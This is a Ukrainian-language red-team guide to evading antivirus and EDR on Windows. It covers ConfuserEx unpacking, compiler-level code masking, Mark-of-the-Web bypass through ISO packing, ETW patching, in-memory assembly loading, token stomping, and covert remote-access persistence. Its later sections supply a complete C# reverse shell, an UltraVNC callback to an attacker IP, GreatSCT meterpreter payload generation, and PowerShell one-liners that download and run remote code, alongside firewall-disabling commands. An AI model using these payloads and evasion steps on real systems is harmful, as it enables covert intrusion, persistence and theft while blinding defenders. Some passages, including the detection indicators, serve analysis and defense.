Під час аналізу шкідливого ПЗ, що використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома рівнями захисту, які блокують декомпілятори й пісочниці. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який згодом можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.<sup>[[10]](#references)</sup>

1.  Видалення захисту від втручання — ConfuserEx шифрує кожне *тіло методу* й розшифровує його всередині статичного конструктора *модуля* (`<Module>.cctor`). Також він змінює контрольну суму PE, тому будь-яка модифікація призведе до аварійного завершення бінарного файла. Використайте **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR-ключі й переписати чисту збірку:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output містить 6 параметрів anti-tamper (`key0-key3`, `nameHash`, `internKey`), які можуть стати в пригоді під час створення власного unpacker.

2.  Відновлення символів / потоку керування — передайте *очищений* файл у **de4dot-cex** (форк de4dot із підтримкою ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Прапорці:
     • `-p crx` – вибрати профіль ConfuserEx 2
     • de4dot скасує сплощення потоку керування, відновить початкові простори імен, класи та назви змінних і розшифрує рядки-константи.

3.  Видалення proxy-викликів – ConfuserEx замінює прямі виклики методів легковаговими обгортками (так званими *proxy-викликами*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Після цього кроку ви маєте побачити звичайні API .NET, як-от `Convert.FromBase64String` або `AES.Create()`, замість непрозорих функцій-обгорток (`Class8.smethod_10`, …).

4.  Ручне очищення – запустіть отриманий бінарний файл у dnSpy і пошукайте великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *справжній* payload. Часто malware зберігає його як TLV-кодований масив байтів, ініціалізований усередині `<Module>.byte_0`.

Наведений вище ланцюжок відновлює потік виконання **без** запуску шкідливого зразка — це корисно під час роботи на ізольованій робочій станції.

> 🛈  ConfuserEx створює спеціальний атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного сортування зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: обфускатор C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): мета цього проєкту — надати форк набору інструментів компіляції [LLVM](http://www.llvm.org/) з відкритим кодом, здатний підвищувати безпеку програмного забезпечення за допомогою [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захисту від підроблення.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як за допомогою мови `C++11/14` генерувати обфускований код під час компіляції без зовнішніх інструментів і без зміни компілятора.
- [**obfy**](https://github.com/fritzone/obfy): додає шар обфускованих операцій, згенерованих фреймворком метапрограмування шаблонів C++, що трохи ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор x64-бінарних файлів, який може обфускувати різні PE-файли, зокрема .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк дрібнозернистої обфускації коду для мов, підтримуваних LLVM, який використовує ROP (програмування, орієнтоване на повернення). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюжки та порушуючи наше звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Самомаскування окремих функцій за допомогою компілятора LLVM

Замість того, щоб маскувати весь implant лише під час простою, змінений бекенд LLVM X86 може тримати вибрані функції XOR-маскованими, коли вони неактивні. PoC Function Peekaboo вибирає демангловані імена, що містять `REG_`, вставляє позиційно-незалежні stubs входу/виходу навколо кінцевого машинного коду та розміщує один спільний обробник маскування в `.text`; сигнатури на рівні вихідного коду та угода викликів Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Перетворення потоку керування в бекенді

Це слід виконувати після вибору інструкцій та оптимізації, оскільки перетворення має охопити **кожну згенеровану інструкцію повернення** та враховувати точне розташування коду x86. `MachineFunctionPass`, що виконується перед генерацією коду, знаходить останню `MachineInstr::isReturn()`, видаляє її, щоб останній шлях переходив до доданого епілогу, а попередні інструкції повернення замінює на `JMP_1 handler`. Зберігайте будь-яке згенероване компілятором очищення стека/кадру перед кожною інструкцією повернення; перенаправляйте лише саму інструкцію повернення.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `emitFunctionBodyEnd()` генерують stubs для кожної функції, а `emitEndOfAsmFile()` генерує обробник. Символи, спільні для етапів генерації, дають змогу переходу з прологу вказувати на його подальший епілог; для вручну згенерованого near `je` запишіть `0F 84`, а потім чотирибайтовий MC-вираз `target - address_after_je`. Виклики та переходи до обробника можна натомість генерувати як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Якщо функцію не вибрано й нічого не змінено, pass має повертати `false`; PoC помилково повертає на цьому шляху `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація до CRT

PoC розміщує XOR-ключ і записи завдовжки 16 байтів, що містять переміщений завантажувачем вказівник на функцію та довжину, визначену під час виконання, у `.funcmeta`. Хоча поле C має тип `uint32_t`, обробник читає QWORD зі зміщенням `+8` у записі, захоплюючи довжину та її доповнення, і переходить до наступного запису з кроком `0x10`. Назви секцій PE мають лише вісім байтів, тому під час виконання пошук бачить `.funcmet`. Зовнішній patcher додає виконувану секцію `.stub`, зберігає старий RVA точки входу в stub і перенаправляє `AddressOfEntryPoint`; PIC-stub отримує базу образу через `gs:[0x60]` → `[PEB+0x10]`, проходить імпорти PE32+, щоб знайти вже імпортовану `VirtualProtect`, і запускається до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Під час ініціалізації в `gs:[0xE8]` записується sentinel, після чого викликається кожна функція з метаданих. Її постійно доступний для читання пролог записує початок функції в `gs:[0xF0]`, виявляє sentinel і пропускає ще не замасковане тіло. Далі епілог використовує `call handler`; після того як обробник зберігає 13 регістрів (`0x68` байтів), адреса повернення в `[rsp+0x68]` є кінцем перетвореної функції, тому `end - start` можна записати в запис її метаданих. Після маскування всіх тіл stub очищує sentinel і переходить до `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний обробник для декодування тіла. Останній шлях переходить до доданого епілогу, а кожна попередня інструкція повернення переходить безпосередньо до спільного обробника. Звичайний епілог також використовує `jmp handler`, а не `call`, тому після повторного маскування інструкція `ret` обробника споживає адресу повернення початкового виклику та зберігає результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Обробник знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці — `0x46` байтів), змінює захист решти ділянки на `PAGE_EXECUTE_READWRITE`, виконує побайтовий XOR із молодшим байтом ключа, а потім встановлює `PAGE_EXECUTE_READ`. Таким чином, той самий цикл декодує код під час входу та кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До показових індикаторів цієї конструкції належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу всередині виконуваної секції `.stub` і секція `.funcmet`, що містить ключ та переміщені вказівники на `.text`;
- розбір PEB, таблиці імпортів і таблиці секцій до CRT із подальшими викликами через кожен вказівник із метаданих;
- однакові PIC-прологи `call`/`pop` і численні місця повернення, перенаправлені до одного обробника;
- записи в `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, за якими йдуть повторювані зміни захисту через `VirtualProtect` та побайтовий запис XOR у виконувані сторінки, відображені з образу.

Це ухилення від сканерів пам’яті, а не криптографічний захист: пропатчений файл усе ще містить початкове незашифроване тіло, а debugger може встановити breakpoint на `VirtualProtect` або цикл XOR і зняти дамп активної функції. Однобайтовий XOR, доступні для читання метадані та фіксована межа `0x46` також спрощують відновлення коду офлайн.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Слоти TEB у PoC є локальними для потоку, але змінені сторінки коду спільні для процесу. Тому одночасний або рекурсивний вхід може перемикати інструкції, поки виконується інший виклик; винятки та нелокальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати переходи, відновлювати фактичний захист, повернений через `lpflOldProtect`, не використовувати жорстко задані довжини stub, перевіряти вирівнювання стека x64 для обох шляхів `call` і `jmp`, а також викликати `FlushInstructionCache` після перезапису виконуваних байтів. Microsoft прямо покладає на викликач відповідальність за узгодженість кешу інструкцій у разі зміни виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen і MoTW

Можливо, ви бачили цей екран під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений захищати кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно використовує підхід на основі репутації: рідко завантажувані застосунки викликають попередження SmartScreen, яке сповіщає кінцевого користувача та перешкоджає запуску файлу (хоча його все ще можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [альтернативний потік даних NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL-адресою, звідки їх завантажили.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликають SmartScreen**.

Дуже ефективний спосіб запобігти присвоєнню вашим payloads Mark of The Web — запакувати їх у контейнер, наприклад ISO. Це працює, оскільки Mark-of-the-Web (MOTW) **не можна** застосувати до томів, що **не використовують NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payloads у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ось демонстрація обходу SmartScreen за допомогою пакування payloads у файли ISO через [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм ведення журналу у Windows, який дає змогу програмам і компонентам системи **записувати події**. Водночас його можуть використовувати й засоби безпеки для моніторингу та виявлення шкідливої активності.

Так само, як вимикають (обходять) AMSI, можна змусити функцію **`EtwEventWrite`** процесу в просторі користувача одразу повертати керування, не записуючи жодних подій. Для цього функцію пропатчують у пам’яті так, щоб вона одразу повертала керування, фактично вимикаючи журналювання ETW для цього процесу.

Докладніше можна прочитати тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Завантаження бінарних файлів C# у пам’ять відоме вже досить давно й досі залишається чудовим способом запускати post-exploitation-інструменти, не потрапляючи на очі AV.

Оскільки payload завантажується безпосередньо в пам’ять, не торкаючись диска, нам потрібно буде подбати лише про патчинг AMSI для всього процесу.

Більшість C2-фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) уже дають змогу виконувати C# assemblies безпосередньо в пам’яті, але є різні способи це зробити:

- **Fork\&Run**

Цей метод передбачає **створення нового sacrificial process**, ін’єкцію в нього шкідливого post-exploitation-коду, виконання цього коду та завершення нового процесу після завершення роботи. Цей підхід має як переваги, так і недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашого Beacon implant. Це означає, що якщо під час post-exploitation-дії щось піде не так або нас виявлять, **імовірність того, що наш implant вціліє, значно вища**. Недолік — **вища ймовірність** виявлення за допомогою **поведінкового виявлення**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей метод передбачає ін’єкцію шкідливого post-exploitation-коду **у власний процес**. Так можна уникнути створення нового процесу та його сканування засобами AV, але якщо під час виконання payload щось піде не так, **імовірність втратити beacon значно вища**, оскільки процес може аварійно завершитися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Щоб дізнатися більше про завантаження C# Assembly, ознайомтеся з цією статтею [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їхнім InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C# Assemblies **з PowerShell**. Ознайомтеся з [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео від S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Перепакування інструментів .NET у WebAssembly за допомогою NativeAOT (WasmForge)

Звичайні методи `execute-assembly` зберігають упізнаваний MSIL і зрештою ініціалізують CLR. **WasmForge** натомість змінює середовище виконання: переносить проєкт C# на експериментальну ціль NativeAOT-LLVM WASI, заздалегідь компілює його у WebAssembly і вбудовує цей модуль у Windows PE host на основі Wazero. Отриманому процесу не потрібні CLR, JIT або host `dotnet` цільової системи, тому правила, що ґрунтуються лише на назвах керованих assemblies, завантаженні CLR, AMSI або .NET ETW, втрачають пряму видимість. Це техніка ухилення/пакування, а не обхід межі привілеїв: guest зберігає дозволи початкового інструмента й видиму поведінку в ОС.<sup>[[44]](#references)[[45]](#references)</sup>

### Збирання проєкту C#

Рекомендований спосіб збирання — Docker-середовище проєкту, оскільки воно містить .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, linker і залежності для підписування. Файл `.csproj` виявляється автоматично; одноетапне збирання виконує міграцію, патчинг сумісності, компіляцію WASM, створення PE та підписування.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Для усунення несправностей або перевірки згенерованого коду розбийте процес на `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` і фінальну команду `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Образ збірки також використовує обгортку `wasm-component-ld`, щоб уникнути кодування компонентів WASI Preview 2 і створити звичайний модуль, очікуваний вбудованим середовищем виконання.<sup>[[44]](#references)[[45]](#references)</sup>

### Перехід між wasm32 C# і x64 Win32

Це не прозора повторна компіляція. NativeAOT-WASI не підтримує деякі функції BCL, орієнтовані на Windows, або змінює їхню поведінку, а гостьова система wasm32 зазвичай виділяє чотирибайтові слоти вказівників, тоді як API x64 можуть повертати восьмибайтові вказівники. WasmForge розв'язує обидві проблеми за допомогою таких згенерованих шарів:<sup>[[44]](#references)</sup>

1. Патчер вихідного коду виправляє семантичні відмінності, специфічні для AOT, і перенаправляє непідтримувані виклики реєстру, каналів, WMI, ідентифікації, служб каталогів, версій файлів, LSA та подібні виклики до помічників `Wf*`.
2. Сканер P/Invoke генерує зіставлення NativeAOT `DirectPInvoke`, щоб виклики `[DllImport]` прив'язувалися до скомпонованих символів моста C замість динамічного завантаження оголошеної DLL усередині гостьової системи.
3. Вказівники, прив'язані до хоста, використовують `ulong` у C# і `uint64_t` у C. Універсальний диспетчер передає виклик обробнику Win32 хоста; `out8_mask` позначає справжні восьмибайтові вихідні слоти, старші половини яких потрібно зберегти. Для непозначених виходів у форматі wasm32 використовується захист зі знімком і відновленням, щоб запис x64 не пошкодив сусідні чотири байти.
4. Спеціалізовані мости хоста обробляють операції, які не підходять для універсальної диспетчеризації системних викликів, наприклад доступ до кешу квитків LSA, операції Kerberos/BCrypt зі структурованими результатами, трафік TCP KDC і запити LDAP.

Наприклад, обгортка для `version.dll!VerQueryValueW` передає чотири адреси хоста й установлює біти 2 і 3 (`0xC`), оскільки вказівник значення та довжина є восьмибайтовими вихідними слотами. Сама обгортка залишається універсальною й передає назву DLL, назву експорту, аргументи та маску до `wf_call_v2`; хост виконує перетворення вказівників і викликає нативний API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Обмеження та зміщення виявлення

Код із великою кількістю reflection, динамічне завантаження збірок, довільні native callbacks і складні структури x64, що повертаються в пам’ять WASM, усе ще можуть потребувати патчів для окремих інструментів або взагалі не працювати. Універсальні сокети WASI Preview 2 також можуть звертатися до порожніх заглушок, тому підтримувані інструменти використовують host shims для конкретних протоколів. Перевіряйте кожну команду на native-збірці, а не припускайте, що функціональність буде однаковою.<sup>[[44]](#references)[[45]](#references)</sup>

Ця техніка зміщує телеметрію, а не робить payload невидимим. Виявлення може зосередитися на PE-файлі, що містить або створює модуль WASM, поведінці на кшталт Wazero runtime, незвичному виділенні та копіюванні пам’яті між host і guest, універсальній прямій диспетчеризації Win32, аномаліях підпису й PE-ресурсів, а також на подальших викликах API та мережевому трафіку. Тому відсутність подій завантаження CLR, AMSI або .NET ETW не слід вважати доказом того, що процес безпечний.<sup>[[44]](#references)</sup>

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати шкідливий код іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора на SMB-ресурсі під контролем атакувальника**.

Надавши доступ до бінарних файлів інтерпретатора та середовища на SMB-ресурсі, можна **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender усе ще сканує скрипти, але використання Go, Java, PHP тощо дає нам **більше гнучкості для обходу статичних сигнатур**. Тестування випадкових необфускованих reverse shell-скриптів цими мовами виявилося успішним.

## Повторне розміщення WebAssembly для ухилення від статичного аналізу

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping змінює токен доступу продукту безпеки, наприклад EDR або AV. Зниження привілеїв токена може залишити процес активним, водночас завадивши йому виконувати привілейовану перевірку або усунення загроз.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати handles до токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного програмного забезпечення

### Chrome Remote Desktop

Як описано в [**цій публікації в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), достатньо встановити Chrome Remote Desktop на комп’ютер жертви, а потім використати його, щоб отримати над ним контроль і забезпечити persistence:<sup>[[35]](#references)</sup>
1. Завантажте програму з https://remotedesktop.google.com/, натисніть «Set up via SSH», а потім натисніть файл MSI для Windows, щоб завантажити його.
2. Запустіть інсталятор у жертви в тихому режимі (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть «Next». Майстер попросить вас пройти авторизацію; натисніть кнопку «Authorize», щоб продовжити.
4. Виконайте надану команду з потрібними змінами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` задає PIN-код без використання GUI).
 

## Розширене ухилення

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Ухилення — дуже складна тема; іноді доводиться враховувати багато різних джерел телеметрії в одній системі, тож у зрілих середовищах майже неможливо залишатися повністю непоміченим.

У кожного середовища, з яким ви працюєте, будуть свої сильні та слабкі сторони.

Наполегливо раджу подивитися цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати базове розуміння розширених технік ухилення.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про багаторівневе ухилення.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Застарілі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Можна скористатися [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини бінарного файлу**, доки **не визначить, яку саме частину Defender** вважає шкідливою, і розділить її для вас.\
Інший інструмент, що робить **те саме, —** [**avred**](https://github.com/dobin/avred), який пропонує послугу через відкритий вебсервіс за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows 10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (як адміністратор), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Зробіть так, щоб він **запускався** під час запуску системи, і **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змініть порт telnet** (stealth) і вимкніть брандмауер:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте його звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні bin-завантаження, а не інсталятор)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Задайте пароль у полі _VNC Password_
- Задайте пароль у полі _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **комп’ютер жертви**

#### **Зворотне з’єднання**

**Нападник** має **запустити на своєму хості** бінарний файл `vncviewer.exe -listen 5900`, щоб бути **готовим** прийняти зворотне **VNC-з’єднання**. Потім на **комп’ютері жертви** запустіть демон winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Щоб зберегти прихованість, не робіть такого:

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він запущений, за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc`, якщо в тій самій директорії немає `UltraVNC.ini`, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для отримання довідки, інакше з’явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Усередині GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть прослуховувач** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний захисник дуже швидко завершить процес.**

### Компілюємо власний reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це з:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# із використанням компілятора

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
